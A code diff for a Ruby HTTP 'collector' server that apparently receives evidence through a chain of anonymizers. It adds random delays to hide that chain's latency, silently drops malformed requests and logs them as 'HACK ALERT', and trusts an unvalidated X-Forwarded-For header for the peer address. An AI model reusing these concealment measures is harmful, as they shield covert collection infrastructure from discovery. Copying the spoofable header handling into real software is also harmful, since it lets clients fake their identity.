@@ -4,10 +4,10 @@
 
 # relatives
 require_relative 'heartbeat'
-require_relative 'parser'
-require_relative 'network_controller'
+require_relative 'http_parser'
 require_relative 'sessions'
 require_relative 'statistics'
+require_relative 'firewall'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -57,7 +57,58 @@ class HTTPHandler < EM::HttpServer::Server
     @closed = true
   end
 
+  # override of the em-http-server handler
+  def http_error_string(code, desc)
+    request = {}
+    request[:headers] = @http
+    peer = http_get_forwarded_peer(@http)
+    @peer = peer unless peer.nil?
+
+    trace :warn, "HACK ALERT: #{@peer} is sending bad requests: #{@http_headers.inspect}"
+
+    # sleep a random amount of time
+    # this is done to prevent latency discovery of the anon chain
+    sleep rand
+    # close the connection
+    close_connection
+
+    return ''
+  end
+
+  def http_request_errback(exception)
+    http_error_string(500, "Server error")
+
+    trace :warn, "HACK ALERT: #{@peer} something caused a deep exception: #{exception.message}"
+  end
+
+  # return the content of the X-Forwarded-For header
+  def http_get_forwarded_peer(headers)
+    # extract the XFF
+    xff = headers[:x_forwarded_for]
+    # no header
+    return nil if xff.nil?
+    # split the peers list
+    peers = xff.split(',')
+    trace :info, "[#{@peer}] has forwarded the connection for #{peers.inspect}"
+    # we just want the first peer that is the original one
+    return peers.first
+  end
+
+  def invalid_http_protocol
+    trace :warn, "HACK ALERT: #{@peer} is sending bad requests (#{@http_protocol}): #{@http_headers.inspect}"
+    # sleep a random amount of time
+    # this is done to prevent latency discovery of the anon chain
+    sleep rand
+    close_connection
+  end
+
   def process_http_request
+
+    # get the peer of the communication
+    # if direct or thru an anonymizer
+    peer = http_get_forwarded_peer(@http)
+    @peer = peer unless peer.nil?
+
     #trace :info, "[#{@peer}] Incoming HTTP Connection"
     size = (@http_content) ? @http_content.bytesize : 0
     trace :debug, "[#{@peer}] REQ: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time}) #{size.to_s_bytes}"
@@ -81,13 +132,17 @@ class HTTPHandler < EM::HttpServer::Server
         generation_time = Time.now
 
         begin
-          raise "Invalid http protocol (#{@http_protocol})" if @http_protocol != 'HTTP/1.1' and @http_protocol != 'HTTP/1.0'
+          if @http_protocol != 'HTTP/1.1' and @http_protocol != 'HTTP/1.0'
+            invalid_http_protocol
+            # return from block
+            next
+          end
 
           # parse all the request params
           request = prepare_request @http_request_method, @http_request_uri, @http_query_string, @http_content, @http, @peer
 
           # get the correct controller
-          controller = CollectorController.new
+          controller = CollectorController.new @signature
           controller.request = request
 
           # do the dirty job :)
@@ -105,15 +160,17 @@ class HTTPHandler < EM::HttpServer::Server
           trace :error, e.message
           trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")
 
-          responder = RESTResponse.new(RESTController::STATUS_BAD_REQUEST)
-          reply = responder.prepare_response(self, {})
-          reply
+          close_connection
         end
 
       end
 
       # Callback block to execute once the request is fulfilled
       response = proc do |reply|
+        # safe escape on invalid reply
+        next unless reply
+
+        # send the actual response
         reply.send_response
 
          # keep the size of the reply to be used in the closing method
@@ -131,68 +188,75 @@ class HTTPHandler < EM::HttpServer::Server
 end #HTTPHandler
 
 
-class Events
-  include RCS::Tracer
-  
-  def setup(port = 80)
+class HttpServer
+  extend RCS::Tracer
 
-    # main EventMachine loop
-    begin
-      # all the events are handled here
-      EM::run do
-        # if we have epoll(), prefer it over select()
-        EM.epoll
-
-        # set the thread pool size
-        EM.threadpool_size = 50
-
-        # we are alive and ready to party
-        SystemStatus.my_status = SystemStatus::OK
-
-        # start the HTTP server
-        if Config.instance.global['COLL_ENABLED']
-          EM::start_server("0.0.0.0", port, HTTPHandler)
-          trace :info, "Listening on port #{port}..."
-
-          # send the first heartbeat to the db, we are alive and want to notify the db immediately
-          # subsequent heartbeats will be sent every HB_INTERVAL
-          HeartBeat.perform
-
-          # set up the heartbeat (the interval is in the config)
-          EM::PeriodicTimer.new(Config.instance.global['HB_INTERVAL']) { EM.defer(proc{ HeartBeat.perform }) }
-
-          # timeout for the sessions (will destroy inactive sessions)
-          EM::PeriodicTimer.new(60) { EM.defer(proc{ SessionManager.instance.timeout }) }
-
-          # calculate and save the stats
-          EM::PeriodicTimer.new(60) { EM.defer(proc{ StatsManager.instance.calculate }) }
-
-          # auto purge old repositories every hour
-          EM::PeriodicTimer.new(3600) { EM.defer(proc{ EvidenceManager.instance.purge_old_repos }) }
-        end
-
-        # set up the network checks (the interval is in the config)
-        if Config.instance.global['NC_ENABLED']
-          # first heartbeat and checks
-          EM.defer(proc{ NetworkController.check })
-          # subsequent checks
-          EM::PeriodicTimer.new(Config.instance.global['NC_INTERVAL']) { EM.defer(proc{ NetworkController.check }) }
-        end
-
-      end
-    rescue Exception => e
-      # bind error
-      if e.message.eql? 'no acceptor'
-        trace :fatal, "Cannot bind port #{port}"
-        return 1
-      end
-      raise
-    end
-
+  def self.running?
+    @server_handle
   end
 
+  def self.start
+    @port = RCS::Collector::Config.instance.global['LISTENING_PORT']
+    trace(:info, "Listening on port #{@port}...")
+    @server_handle = EM.start_server("0.0.0.0", @port, HTTPHandler)
+  rescue Exception => e
+    trace(:fatal, "Unable to start http server on port #{@port}: #{e.message} #{e.backtrace}")
+    exit!(1)
+  end
+
+  def self.stop
+    return unless @server_handle
+
+    trace(:info, "Stopping http server...")
+    EM.stop_server(@server_handle) if @server_handle
+    @server_handle = nil
+  rescue Exception => e
+    trace(:fatal, "Unable to stop http server: #{e.message} #{e.backtrace}")
+    exit!(1)
+  end
+
+end
+
+
+class Events
+  include RCS::Tracer
+
+  def setup
+    # if we have epoll(), prefer it over select()
+    EM.epoll
+
+    # set the thread pool size
+    EM.threadpool_size = 50
+
+    EM::run do
+      # we are alive and ready to party
+      SystemStatus.my_status = SystemStatus::OK
+
+      if Firewall.ok?
+        Firewall.create_default_rules
+        HttpServer.start
+      else
+        trace(:error, "#{Firewall.error_message}. The http server will not start.")
+      end
+
+      # send the first heartbeat to the db, we are alive and want to notify the db immediately
+      # subsequent heartbeats will be sent every HB_INTERVAL
+      HeartBeat.perform
+
+      # set up the heartbeat (the interval is in the config)
+      EM::PeriodicTimer.new(Config.instance.global['HB_INTERVAL']) { EM.defer(proc{ HeartBeat.perform }) }
+
+      # timeout for the sessions (will destroy inactive sessions)
+      EM::PeriodicTimer.new(60) { EM.defer(proc{ SessionManager.instance.timeout }) }
+
+      # calculate and save the stats
+      EM::PeriodicTimer.new(60) { EM.defer(proc{ StatsManager.instance.calculate }) }
+
+      # auto purge old repositories every hour
+      EM::PeriodicTimer.new(3600) { EM.defer(proc{ EvidenceManager.instance.purge_old_repos }) }
+    end
+  end
 end #Events
 
 end #Collector::
 end #RCS::
-
